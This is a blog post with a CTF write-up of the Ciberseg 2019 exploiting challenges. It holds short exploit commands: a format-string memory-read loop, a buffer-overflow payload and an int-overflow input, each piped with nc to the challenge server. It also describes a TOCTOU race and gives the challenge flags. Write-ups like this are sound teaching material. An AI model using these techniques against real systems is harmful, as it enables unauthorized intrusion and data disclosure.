---
layout: post
title:  "Ciberseg 2019: exploiting"
date:	2019-01-27 11:27:51 +0100
author: foo
categories: ctf ciberseg write-up exploiting
ref: ciberseg-2019-exploiting
---

In this post I will explain my solutions for the challenges on the Ciberseg '19 CTF.
Specifically, these are the ones corresponding to the **exploiting** category.

[Ciberseg](https://ciberseg.uah.es/) is an annual congress which takes place in the
University of Alcalá de Henares. The truth is that previous years it has been always fun,
and this year wasn't less :) Also, the first places were disputed hard and there were
last-time surprises :D (in the end, I literally won at the last hour by just a few
points).


Anyways, these are the challenges and their solutions. Unfortunately, these challenges
were all done on their servers, so I don't have the resources needed to set them up and
solve them by yourselves.

-----------------------------------------------------------------------------------------

# 1.- Parrot (100 points)


The description of this message states:
> We've found a parrot to manage the flags. We got him living in port 2323

This challenge consisted in a program which echoed exactly what he received. The problem
is that it's not correctly written and it doesn't echo _exactly_ whatever we send to it.
For example, if we send `%p` it returns things like _(nil)_, _0x8485632_... Therefore,
it's vulnerable to a _format strings_ exploitation.

To get the flag, we simply have to read the contents of the memory until we get the flag.
For instance, I made this little script:
```sh
#!/bin/bash

for i in {1..20}
do
	printf "\n ---- %3d ---- \n" "$i"
	echo -e "AAAABBBB-%$i\$s\n" | nc ctf.alphasec.xyz 2323
done
```

At the tenth or eleventh try appears our flag: `flag{passwordseña_dude}`.

-----------------------------------------------------------------------------------------

# 2.- Xorizo (125 points)


The description of this message states:
> We made the definitive program to pass the Discrete Structures course, but when
> introducing the password, we are unable to decrypt the secret. The password is
> "estructurasdiscretasjeje", but when we use it we get something incomprehensible.
>
> This is the code:
> ```c
> void main(){
>
>	char pass[24] = "xxxxxxxxxxxxxxxxxxxxxxxx";
>	char x[10];
>
>	char flag[24] = ...;
>
>	char* res = malloc(24);
>
>	scanf("%s", x);
>	printf("%s\n", pass);
>
>	int i;
>	for(i = 0; i < 24; i++)
>		res = pass ^ flag;
>
>	printf("%s\n", res);
>
> }
> ```
>
> Can you bear us a hand? It's running in ctf.alphasec.xyz:2424


After we connect, we're asked for a password and then something is printed, but it seems
to be just junk. However, if we introduce more than 10 characters, this printed string
changes. As we have the code available, we can check that there's a _buffer overflow_:
_buffer overflow_:
{% highlight C linenos %}
void main ()
{
	char pass [24] = "xxxxxxxxxxxxxxxxxxxxxxxx";
	char x [10];

	char flag [24] = ...;

	char* res = malloc (24);

==>	scanf ("%s", x);	/* OVERFLOW! The input string is not checked to fit in X */
	printf ("%s\n", pass);

	int i;
	for (i = 0; i < 24; i++)
		res = pass ^ flag;

	printf ("%s\n", res);
}
{% endhighlight %}


As is shown in the highlighted line (**:10**), the input string is blindly copied into
_x_ without properly checking the boundaries, while that variable can only fit 10 Bytes
(9 characters and the end of string delimiter, _0x00_). Once we overflow the contents of
_x_, we can overwrite _pass_.

After reading the input, the program performs an XOR between the variable _pass_ and the
_flag_. As we can control what value does _pass_ have, we can extract the original value
if the flag. But... Which is the appropriate value for _pass_?

We deduce that the value for _pass_ have been calculated using <img src="https://latex.codecogs.com/svg.latex?\fn_cm%20flag%20\oplus%20pass" class="inline-math" alt="flag \oplus pass">.
Knowing this, we can calculate that <img src="https://latex.codecogs.com/svg.latex?\fn_cm%20\left(%20flag%20\oplus%20pass%20\right)%20\oplus%20pass%20=%20flag" class="inline-math" alt="\left( flag \oplus pass \right) \oplus pass = flag">
to give the value `estructurasdiscretasjeje` to _pass_ and we end up with the original
value of _flag_.

Putting it all together, our exploit would be something like this:
```sh
printf "0123456789estructurasdiscretasjeje\n" | nc ctf.alphasec.xyz 2424
```

And we get the _flag_: `flag{lohacehastaunperro}`

-----------------------------------------------------------------------------------------

# 3.- Numerao, numerao... (150 points)

The description of this message states:
> Long live numeration!
>
> In ctf.alphasec.xyz:2525 we have a system that only accepts positive integers, but
> above all it hates zeroes. If after operating with the inputs it got a 0... We don't
> want to imagine what catastrophic results it could have.

The service running in the port 2525 asks for three numbers and then returns their sum.
Clearly, the intention in this challenge is to force an overflow of the used data type so
the numbers are treated as negatives. Specifically, this is about an _int overflow_: if
we input a number greater than <img src="https://latex.codecogs.com/svg.latex?\fn_cm%20\frac%20{2^{32}}{2}%20-%201%20=%202147483647" class="inline-math" alt="\fn_cm \frac {2^{32}}{2} - 1 = 2147483647">
we can play with the three operands until we obtain 0.

In the end, the values I used were **2147483647**, **2147483647** and **2**:
```sh
echo -e "2147483647\n2147483647\n2" | nc ctf.alphasec.xyz 2525
```

When we manage to get the result 0, it returns the flag: `flag{pavoreal_uuu}`.


-----------------------------------------------------------------------------------------

# 4.- Run Chicote (200 points)


This was the only challenge I couldn't complete; but it was just a matter of exploiting
the TOCTOU  race condition (_Time Of Check - Time of Use_). If leave over here
[@KaoRz's gist](https://gist.github.com/KaoRz/44ed827c258054577fc59cd70a9f381d), who did
managed to do it.

The code is pretty simple to understand: basically, we have to request (using HTTP) the
resources `/verify` and `/read` simultaneously until we get to read the flag.

-----------------------------------------------------------------------------------------

And that's it. These challenges were shorter than the crypto ones.

I always enjoy Ciberseg's challenges, and this year they were over the top. I hope to
have time to compete next year. I'm sure they'll excel again :)

I also want to congratulate the organizers for all their effort and their creativity to
design challenges that differ from the usual.
